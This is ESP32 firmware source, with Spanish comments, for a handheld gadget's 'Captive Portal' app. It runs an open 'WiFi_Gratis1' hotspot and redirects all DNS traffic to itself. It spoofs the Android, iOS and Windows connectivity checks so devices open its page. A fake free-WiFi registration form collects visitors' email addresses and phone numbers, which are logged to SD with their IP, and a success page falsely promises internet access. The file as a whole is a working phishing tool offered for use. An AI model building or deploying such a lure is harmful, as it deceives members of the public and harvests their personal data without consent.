#include "Apps/screen_captive.h"  
#include "Drivers/buzzer.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>
#include <SPI.h>
#include <FS.h>

// ========== CONFIGURACIÓN ==========
const char* AP_SSID = "WiFi_Gratis1";
const char* AP_PASS = "";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netmask(255, 255, 255, 0);
DNSServer dnsServer;
WebServer webServer(80);

bool captiveRunning = false;
int capturedCount = 0;

// ========== FUNCIONES SD ==========
void initSD() {
  pinMode(PIN_CD, OUTPUT);
  digitalWrite(PIN_CD, HIGH);
  delay(100);
  
  if (!SD.begin(PIN_CD)) {
    Serial.println(" SD: No disponible");
    return;
  }
  Serial.println(" SD: OK");
  
  // Listar contenido de la SD
  Serial.println(" Archivos en SD:");
  File root = SD.open("/");
  File file = root.openNextFile();
  while(file) {
    Serial.print("   ");
    Serial.print(file.name());
    if(file.isDirectory()) {
      Serial.println("/");
      if(String(file.name()) == "portal") {
        File portalFile = file.openNextFile();
        while(portalFile) {
          Serial.print("     ");
          Serial.println(portalFile.name());
          portalFile = file.openNextFile();
        }
      }
    } else {
      Serial.print(" (");
      Serial.print(file.size());
      Serial.println(" bytes)");
    }
    file = root.openNextFile();
  }
  
  // Crear archivo de log con nuevo formato
  if (!SD.exists("/captive_log.txt")) {
    File file = SD.open("/captive_log.txt", FILE_WRITE);
    if (file) {
      file.println("=== CAPTIVE PORTAL LOG ===");
      file.println("Timestamp,Correo,Telefono,IP");
      file.close();
      Serial.println(" Archivo de log creado");
    }
  }
}

void logToSD(const String& correo, const String& telefono, const String& ip) {
  if (!SD.begin(PIN_CD)) return;
  
  File file = SD.open("/captive_log.txt", FILE_APPEND);
  if (file) {
    unsigned long timestamp = millis() / 1000;
    file.print(timestamp);
    file.print(",");
    file.print(correo);
    file.print(",");
    file.print(telefono);
    file.print(",");
    file.println(ip);
    file.close();
    Serial.println(" Log: " + correo + ", " + telefono + ", " + ip);
    capturedCount++;
  }
}

// ========== SERVIDOR DE ARCHIVOS DESDE SD ==========
bool serveFileFromSD(String path) {
  if (!SD.begin(PIN_CD)) {
    Serial.println(" SD no disponible para servir archivos");
    return false;
  }
  
  if (path == "" || path == "/") {
    path = "/portal/index.html";
  }
  else if (!path.startsWith("/")) {
    path = "/" + path;
  }
  else if (path == "/portal") {
    path = "/portal/index.html";
  }
  else if (path == "/portal/") {
    path = "/portal/index.html";
  }
  
  Serial.println(" Buscando: " + path);
  
  if (!SD.exists(path)) {
    Serial.println(" No encontrado: " + path);
    return false;
  }
  
  File file = SD.open(path, FILE_READ);
  if (!file) {
    Serial.println(" No se pudo abrir: " + path);
    return false;
  }
  
  String contentType = "text/html";
  if (path.endsWith(".css")) contentType = "text/css";
  else if (path.endsWith(".js")) contentType = "application/javascript";
  else if (path.endsWith(".png")) contentType = "image/png";
  else if (path.endsWith(".jpg") || path.endsWith(".jpeg")) contentType = "image/jpeg";
  else if (path.endsWith(".ico")) contentType = "image/x-icon";
  else if (path.endsWith(".txt")) contentType = "text/plain";
  else if (path.endsWith(".json")) contentType = "application/json";
  
  Serial.println(" Sirviendo: " + path + " (" + file.size() + " bytes) como " + contentType);
  webServer.streamFile(file, contentType);
  file.close();
  return true;
}

// ========== PÁGINA DE ERROR 404 ==========
void sendErrorPage(String error) {
  String errorHTML = "<!DOCTYPE html><html><head>";
  errorHTML += "<meta charset='UTF-8'>";
  errorHTML += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  errorHTML += "<title>Error - Portal no disponible</title>";
  errorHTML += "<style>";
  errorHTML += "*{margin:0;padding:0;box-sizing:border-box}";
  errorHTML += "body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);";
  errorHTML += "min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}";
  errorHTML += ".card{background:#fff;border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,.2);";
  errorHTML += "max-width:500px;width:100%;padding:30px;text-align:center}";
  errorHTML += "h1{color:#dc3545;margin-bottom:15px}";
  errorHTML += "h2{color:#333;margin-bottom:20px;font-size:20px}";
  errorHTML += "p{color:#666;margin-bottom:15px;line-height:1.6}";
  errorHTML += ".error{background:#f8d7da;color:#721c24;padding:12px;border-radius:8px;margin:20px 0;font-family:monospace}";
  errorHTML += ".footer{margin-top:25px;color:#999;font-size:12px}";
  errorHTML += "</style></head><body>";
  errorHTML += "<div class='card'>";
  errorHTML += "<h1>⚠️ Error 404</h1>";
  errorHTML += "<h2>Portal no configurado</h2>";
  errorHTML += "<div class='error'>" + error + "</div>";
  errorHTML += "<p>Para usar el portal cautivo, copia los archivos HTML a la tarjeta SD:</p>";
  errorHTML += "<p style='background:#f0f0f0;padding:10px;border-radius:5px;font-family:monospace;'>";
  errorHTML += "/portal/index.html<br>";
  errorHTML += "/portal/style.css<br>";
  errorHTML += "/portal/success.html</p>";
  errorHTML += "<p class='footer'>WiFi Gratis Captive Portal</p>";
  errorHTML += "</div></body></html>";
  
  webServer.send(404, "text/html", errorHTML);
}

// ========== HANDLERS WEB ==========
void handleRoot() {
  Serial.println(" Root request - Buscando /portal/index.html");
  if (!serveFileFromSD("/portal/index.html")) {
    // HTML de emergencia con correo y teléfono
    String emergencyHTML = "<!DOCTYPE html><html><head>";
    emergencyHTML += "<meta charset='UTF-8'>";
    emergencyHTML += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    emergencyHTML += "<title>WiFi Gratis</title>";
    emergencyHTML += "<style>";
    emergencyHTML += "*{margin:0;padding:0;box-sizing:border-box}";
    emergencyHTML += "body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}";
    emergencyHTML += ".card{background:#fff;border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,.2);max-width:400px;width:100%;padding:30px}";
    emergencyHTML += "h1{color:#333;margin-bottom:10px;text-align:center}";
    emergencyHTML += ".sub{color:#666;margin-bottom:25px;text-align:center}";
    emergencyHTML += ".fg{margin-bottom:20px}";
    emergencyHTML += "label{display:block;color:#555;margin-bottom:8px;font-weight:600}";
    emergencyHTML += "input{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px}";
    emergencyHTML += "input:focus{outline:none;border-color:#667eea}";
    emergencyHTML += "button{width:100%;padding:14px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}";
    emergencyHTML += "</style></head><body>";
    emergencyHTML += "<div class='card'>";
    emergencyHTML += "<h1>🌐 WiFi Gratis</h1>";
    emergencyHTML += "<p class='sub'>Regístrate para conectarte</p>";
    emergencyHTML += "<form action='/submit' method='POST'>";
    emergencyHTML += "<div class='fg'><label>Correo Electrónico</label>";
    emergencyHTML += "<input type='email' name='correo' required placeholder='tucorreo@ejemplo.com'></div>";
    emergencyHTML += "<div class='fg'><label>Número de Teléfono</label>";
    emergencyHTML += "<input type='tel' name='telefono' required placeholder='1234-5678' pattern='[0-9]{4}-[0-9]{4}'></div>";
    emergencyHTML += "<button type='submit'>Conectar Ahora</button>";
    emergencyHTML += "</form></div></body></html>";
    webServer.send(200, "text/html", emergencyHTML);
  }
}

void handleCSS() {
  serveFileFromSD("/portal/style.css");
}

void handleSuccess() {
  Serial.println(" Success request");
  if (!serveFileFromSD("/portal/success.html")) {
    String success = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Conectado</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#11998e,#38ef7d);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,.2);max-width:400px;width:100%;padding:40px;text-align:center}.check{font-size:60px;margin-bottom:20px;color:#38ef7d}h1{color:#333;margin-bottom:15px}p{color:#666;line-height:1.6}</style></head><body><div class='card'><div class='check'>✓</div><h1>¡Conectado!</h1><p>Gracias por registrarte.<br>Ahora puedes navegar gratis.</p></div></body></html>";
    webServer.send(200, "text/html", success);
  }
}

void handleSubmit() {
  if (webServer.hasArg("correo") && webServer.hasArg("telefono")) {
    String correo = webServer.arg("correo");
    String telefono = webServer.arg("telefono");
    String ip = webServer.client().remoteIP().toString();
    
    logToSD(correo, telefono, ip);
    
    webServer.sendHeader("Location", "/portal/success.html", true);
    webServer.send(302, "text/plain", "");
  } else {
    webServer.send(400, "text/plain", "Datos incompletos");
  }
}

// ========== DETECTORES DE PORTAL CAUTIVO ==========
void handleGenerate204() {
  Serial.println(" Android 204 - OK");
  webServer.send(204, "text/plain", "");
}

void handleConnectivityCheck() {
  Serial.println(" Windows NCSI - Microsoft NCSI");
  webServer.send(200, "text/plain", "Microsoft NCSI");
}

void handleHotspotDetect() {
  Serial.println(" iOS hotspot - Redirect");
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>";
  html += "</head><body></body></html>";
  webServer.send(200, "text/html", html);
}

void handleSuccessTxt() {
  Serial.println(" iOS success.txt");
  webServer.send(200, "text/plain", "success");
}

void handleRedirect() {
  Serial.println(" Windows redirect");
  webServer.sendHeader("Location", "http://192.168.4.1/", true);
  webServer.send(302, "text/plain", "");
}

// ========== HANDLER PARA TODO LO DEMÁS ==========
void handleNotFound() {
  String uri = webServer.uri();
  String ip = webServer.client().remoteIP().toString();
  String userAgent = webServer.header("User-Agent");
  
  Serial.println("\n NUEVA PETICIÓN:");
  Serial.println("   URL: " + uri);
  Serial.println("   IP: " + ip);
  if (userAgent.length() > 0) {
    Serial.println("   UA: " + userAgent.substring(0, 60));
  }
  
  // ===== DETECTORES DE PORTAL CAUTIVO =====
  
  // ANDROID
  if (uri.indexOf("204") > 0 || uri.indexOf("gen_") >= 0) {
    Serial.println("   📱 ANDROID - Enviando 204");
    webServer.send(204, "text/plain", "");
    return;
  }
  
  // iOS
  if (uri == "/hotspot-detect.html" || uri == "/library/test/success.html") {
    Serial.println("    iOS - Redirect");
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>";
    html += "</head><body></body></html>";
    webServer.send(200, "text/html", html);
    return;
  }
  
  if (uri == "/success.txt") {
    Serial.println("    iOS success.txt");
    webServer.send(200, "text/plain", "success");
    return;
  }
  
  // WINDOWS
  if (uri == "/ncsi.txt" || uri == "/connecttest.txt") {
    Serial.println("    Windows NCSI");
    webServer.send(200, "text/plain", "Microsoft NCSI");
    return;
  }
  
  if (uri == "/redirect") {
    Serial.println("    Windows redirect");
    webServer.sendHeader("Location", "http://192.168.4.1/", true);
    webServer.send(302, "text/plain", "");
    return;
  }
  
  // ===== ARCHIVOS ESTÁTICOS =====
  if (uri.startsWith("/portal/") || uri.endsWith(".css") || uri.endsWith(".js") || 
      uri.endsWith(".png") || uri.endsWith(".jpg") || uri.endsWith(".ico")) {
    if (serveFileFromSD(uri)) {
      return;
    }
  }
  
  // ===== REDIRECCIÓN =====
  Serial.println("    REDIRIGIENDO a http://192.168.4.1/");
  webServer.sendHeader("Location", "http://192.168.4.1/", true);
  webServer.send(302, "text/plain", "");
}

// ========== CONTROL CAPTIVE PORTAL ==========
void startCaptivePortal() {
  if (captiveRunning) return;
  
  Serial.println("\n\n=================================");
  Serial.println(" INICIANDO PORTAL CAUTIVO");
  Serial.println("=================================");
  
  initSD();
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netmask);
  WiFi.softAP(AP_SSID, AP_PASS);
  
  delay(100);
  
  Serial.print(" IP: ");
  Serial.println(WiFi.softAPIP());
  Serial.print(" SSID: ");
  Serial.println(AP_SSID);
  
  dnsServer.start(DNS_PORT, "*", apIP);
  
  // ===== RUTAS PRINCIPALES =====
  webServer.on("/", handleRoot);
  webServer.on("/index.html", handleRoot);
  webServer.on("/portal/", handleRoot);
  webServer.on("/portal/index.html", handleRoot);
  
  webServer.on("/submit", HTTP_POST, handleSubmit);
  webServer.on("/portal/success.html", handleSuccess);
  webServer.on("/success.html", handleSuccess);
  webServer.on("/portal/style.css", handleCSS);
  webServer.on("/style.css", handleCSS);
  
  // ===== DETECTORES =====
  webServer.on("/generate_204", handleGenerate204);
  webServer.on("/gen_204", handleGenerate204);
  webServer.on("/hotspot-detect.html", handleHotspotDetect);
  webServer.on("/library/test/success.html", handleHotspotDetect);
  webServer.on("/success.txt", handleSuccessTxt);
  webServer.on("/ncsi.txt", handleConnectivityCheck);
  webServer.on("/connecttest.txt", handleConnectivityCheck);
  webServer.on("/redirect", handleRedirect);
  
  webServer.onNotFound(handleNotFound);
  webServer.begin();
  
  captiveRunning = true;
  capturedCount = 0;
  
  Serial.println(" PORTAL CAUTIVO ACTIVO");
  Serial.println("=================================\n");
}

void stopCaptivePortal() {
  if (!captiveRunning) return;
  
  Serial.println(" Deteniendo Portal Cautivo...");
  
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  
  captiveRunning = false;
  Serial.println(" Portal Cautivo DETENIDO");
}

bool isCaptiveRunning() {
  return captiveRunning;
}

// ========== BOTONES ==========
static bool isButtonJustPressed(int pin) {
  static uint8_t lastStableState[4] = {HIGH, HIGH, HIGH, HIGH};
  static uint8_t lastReading[4] = {HIGH, HIGH, HIGH, HIGH};
  static unsigned long lastDebounceTime[4] = {0, 0, 0, 0};

  const int pins[4] = {PIN_SELECT, PIN_UP, PIN_DOWN, PIN_BACK};
  int index = -1;

  for (int i = 0; i < 4; i++) {
    if (pins[i] == pin) {
      index = i;
      break;
    }
  }
  if (index == -1) return false;

  uint8_t reading = digitalRead(pin);

  if (reading != lastReading[index]) {
    lastDebounceTime[index] = millis();
    lastReading[index] = reading;
  }

  if ((millis() - lastDebounceTime[index]) > 50) {
    if (lastStableState[index] == HIGH && reading == LOW) {
      lastStableState[index] = reading;
      return true;
    }
    lastStableState[index] = reading;
  }

  return false;
}

// ========== PANTALLA ==========
void screenCaptiveLoop() {
  if (captiveRunning) {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  if (isButtonJustPressed(PIN_BACK)) {
    buzzerClick();
    if (captiveRunning) stopCaptivePortal();
    currentScreen = SCREEN_APPS;
    return;
  }
  
  if (isButtonJustPressed(PIN_SELECT)) {
    buzzerBeep();
    if (captiveRunning) {
      stopCaptivePortal();
    } else {
      startCaptivePortal();
    }
  }
  
  u8g2.clearBuffer();
  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  u8g2.setFont(u8g2_font_6x10_tr);
  
  u8g2.drawStr(20, 10, "Captive Portal");
  u8g2.drawLine(0, 12, 127, 12);
  
  if (captiveRunning) {
    u8g2.drawStr(10, 24, "Estado: ACTIVO");
    u8g2.drawStr(10, 36, "SSID:");
    u8g2.drawStr(40, 36, AP_SSID);
    
    bool hasIndex = false;
    if (SD.begin(PIN_CD)) {
      hasIndex = SD.exists("/portal/index.html");
    }
    
    if (hasIndex) {
      u8g2.drawStr(10, 48, "Portal: OK");
    } else {
      u8g2.drawStr(10, 48, "Portal: EMERGENCIA");
    }
    
    char buffer[20];
    snprintf(buffer, sizeof(buffer), "Logs: %d", capturedCount);
    u8g2.drawStr(70, 48, buffer);
    
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(5, 60, "SEL:Detener BACK:Salir");
  } else {
    u8g2.drawStr(10, 24, "Estado: INACTIVO");
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(10, 38, "Captura correo y telefono");
    u8g2.drawStr(10, 46, "Carpeta: /portal/");
    u8g2.drawStr(10, 54, "Logs: captive_log.txt");
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(5, 62, "SEL:Iniciar BACK:Salir");
  }
  
  u8g2.sendBuffer();
}